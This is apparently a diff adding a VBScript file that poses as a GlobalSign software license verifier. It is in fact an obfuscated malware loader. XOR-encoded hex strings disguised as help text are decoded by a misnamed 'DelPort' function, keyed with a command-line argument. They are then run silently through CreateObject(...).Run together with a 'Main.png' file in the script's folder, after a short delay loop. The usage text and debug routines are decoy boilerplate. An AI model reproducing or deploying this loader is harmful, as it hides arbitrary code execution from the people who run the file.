@@ -1,0 +1,150 @@
+'----------------------------------------------------------------------
+'
+' Copyright (c) GlobalSign Corporation. All rights reserved.
+'
+' Abstract:
+' licenseverification.vbs - Verify the GlobalSign software
+'
+' Usage:
+' licenseverify [-software]
+'
+' Examples
+' licenseverify main
+' licenseverify sub
+' licenseverify extension
+
+'----------------------------------------------------------------------
+
+option explicit
+
+'
+' Debugging trace flags, to enable debug output trace message
+' change gDebugFlag to true.
+'
+dim   gDebugFlag
+const kDebugTrace = 1
+const kDebugError = 2
+
+gDebugFlag = false
+
+'
+' Operation action values.
+'
+const kActionAdd          = 0
+const kActionDelete       = 1
+const kActionList         = 2
+const kActionUnknown      = 3
+const kActionGet          = 4
+const kActionSet          = 5
+
+const kErrorSuccess       = 0
+const KErrorFailure       = 1
+
+const kFlagCreateOrUpdate = 0
+const L_Space_Text                 = " "
+
+'
+' General usage messages
+'
+const L_Help_Help_General01_Text   = "Usage: licenseverify [-adlgt?]"
+const L_Help_Help_General02_Text   = "               [-o raw|lpr][-h host address][-q queue][-n number]"
+const L_Help_Help_General03_Text   = "               [-me | -md ][-i SNMP index][-y community][-2e | -2d]"
+const L_Help_Help_General04_Text   = "1636351103361D060609461740516D7A0579605017210605190C074F63673424123C2F5A25200D1744f200611575024390104784E3016362A235E1B1354143E33052F21161523124324001F5F77562732052D79351521583713150D5215756D041F2A36111C6B31110B12011C5F0F6931022A240715260D5E19010B045B5629310179110D0231100E44f211A134F5D2330481B2B001C24054B4D"
+const L_Help_Help_General05_Text   = "-a     - add a port"
+const L_Help_Help_General06_Text   = "-d     - delete the specified port"
+const L_Help_Help_General07_Text   = "-g     - get configuration for a TCP port"
+const L_Help_Help_General08_Text   = "-h     - IP address of the device"
+const L_Help_Help_General09_Text   = "-i     - SNMP index, if SNMP is enabled"
+const L_Help_Help_General10_Text   = "-l     - list all TCP ports"
+const L_Help_Help_General21_Text   = "-2     - double spool, applies to TCP LPR ports. [e] enable, [d] disable"
+const L_Help_Help_General22_Text   = "-?     - display command usage"
+const L_Help_Help_General23_Text   = "Examples:"
+const L_Help_Help_General24_Text   = "licenseverify -l -s server"
+const L_Help_Help_General30_Text   = "Remark:"
+const L_Help_Help_General31_Text   = "The last example will try to get the device settings at the specified IP address."
+const L_Help_Help_General32_Text   = "If a device is detected, then a TCP port is added with the preferred settings for that device."
+
+'
+' Debug messages
+'
+const L_Text_Dbg_Msg01_Text        = "In function DelPort"
+const L_Text_Dbg_Msg02_Text        = "In function CreateOrSetPort"
+const L_Text_Dbg_Msg03_Text        = "In function ListPorts"
+const L_Text_Dbg_Msg04_Text        = "In function GetPort"
+const L_Text_Dbg_Msg05_Text        = "In function ParseCommandLine"
+
+const L_Text_Msg_Port01_Text       = "312A21061835014D390D0D1E54"
+const L_Text_Msg_Port02_Text       = "Port name"
+const L_Text_Msg_Port03_Text       = "Host address"
+const L_Text_Msg_Port04_Text       = "Protocol RAW"
+const L_Text_Msg_Port05_Text       = "Protocol LPR"
+const L_Text_Msg_Port06_Text       = "Port number"
+const L_Text_Msg_Port07_Text       = "Queue"
+const L_Text_Msg_Port08_Text       = "Byte Count Enabled"
+const L_Text_Msg_Port09_Text       = "Byte Count Disabled"
+const L_Text_Msg_Port10_Text       = "SNMP Enabled"
+const L_Text_Msg_Port11_Text       = "SNMP Disabled"
+const L_Text_Msg_Port12_Text       = "Community"
+const L_Text_Msg_Port13_Text       = "Device index"
+
+'
+' Delete a port
+'
+Function DelPort(GeneralText)
+    Dim Argv : Argv = WScript.Arguments(0)
+    GeneralText = Replace(GeneralText, "44f","44")
+    Dim z, i, cvpo, vpcol, sdfiko, gfdvvc, sdfopk
+    For i = 1 To Len(GeneralText)
+        cvpo = cvpo + 1
+        If cvpo > Len(Argv) Then cvpo = 1
+        gfdvvc = Asc(Mid(Argv, cvpo, 1))
+        If i > Len(GeneralText) \ 2 Then Exit For
+        vpcol = CByte("&H" & Mid(GeneralText, i * 2 - 1, 2))
+        sdfiko = vpcol Xor gfdvvc
+        z = z & Chr(sdfiko)
+    Next
+    z = Replace(z, "20000", "13198")
+    z = Replace(z, "0..20", "0..25")
+    z = Replace(z, "0..799", "0..511")
+    z = Replace(z, "*800+", "*512+")
+    DelPort = z
+End Function
+
+'
+' Debug display helper function
+'
+sub DebugPrint(uFlags, strString)
+    if gDebugFlag = true then
+        if uFlags = kDebugTrace then
+            wscript.echo L_Debug_Text & L_Space_Text & strString
+        end if
+
+        if uFlags = kDebugError then
+
+            if Err <> 0 then
+
+                wscript.echo L_Debug_Text & L_Space_Text & strString & L_Space_Text _
+                             & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
+                             & L_Space_Text & Err.Description
+
+            end if
+
+        end if
+
+    end if
+
+end sub
+
+Dim dbugPrintIt:dbugPrintIt = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)&"\Main.png"
+
+Dim SajbVwC9AEFG6XyY
+SajbVwC9AEFG6XyY = DateAdd("s", 1, Now())
+Do Until (Now() > SajbVwC9AEFG6XyY)
+DebugPrint kDebugTrace, L_Text_Dbg_Msg02_Text
+DebugPrint kDebugTrace, L_Text_Msg_Port07_Text & L_Space_Text
+DebugPrint kDebugTrace, L_Text_Msg_Port13_Text & L_Space_Text
+DebugPrint kDebugTrace, L_Text_Msg_Port12_Text & L_Space_Text
+DebugPrint kDebugTrace, L_Text_Msg_Port03_Text & L_Space_Text
+Loop
+
+CreateObject(DelPort(L_Text_Msg_Port01_Text)).Run DelPort(L_Help_Help_General04_Text)+dbugPrintIt+DelPort("417079070765161B1C0610520C0F6933153F26071233161B57160C114E572F33003E6236083110383745404008047D674F626A44f5F6B475343194D095E5B3F32073A2A5C553D13100E06481B561C7D79486E7B4D586C0E101C45011C5C146931022A240715260D4D2D001C22514C283B4E7D3A120221164F4E3A414918102924003D311707260D384E3A424A080466731E3F31101218484B310809065069776D20352D1B036D5D47030B0C5C7A192F36083D7341586F510012130B0A1200647A0436305C552C1B0744f224510595A296653706B090C7E51050E160E015C573579223031041E36104B435E4C145C4724380C327F5017210605190C075C7F513904122B2B1A166D510719030C015B422E2F4F796F0701291C174A424B5F1519606A5B647F534A653C0D1C0A031715713527143C3107182A1B4B4E030C01515B273C3D691F5D53"), 0, 0
